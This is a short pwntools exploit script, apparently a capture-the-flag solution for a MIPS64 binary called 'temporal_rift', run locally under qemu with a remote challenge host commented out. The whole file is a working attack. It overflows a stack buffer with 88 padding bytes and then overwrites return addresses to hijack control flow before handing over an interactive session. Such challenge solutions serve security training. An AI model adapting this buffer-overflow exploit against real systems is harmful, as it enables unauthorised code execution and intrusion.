#!/usr/bin/python3
# ret to 0x0000000120003F80
from pwn import *

context.arch = 'mips64'
context.endian = 'big'

qemu_lib_path = '/usr/mips64-linux-gnuabi64/'
p = process(['qemu-mips64', '-L', qemu_lib_path, './temporal_rift'])
#p = process(['qemu-mips64', '-g', '1234', '-L', qemu_lib_path, './temporal_rift'])
#p = remote("node-4.mcsc.space",35481)
#input("ENTER")
p.sendlineafter(">>> ",b"3")

payload = b'a'*88
payload += p64(0x00000001200b51c0)
payload += p64(0x1200af080)
payload += p64(0x0000000120003FA0)

p.sendlineafter(">>> ",payload)

p.interactive()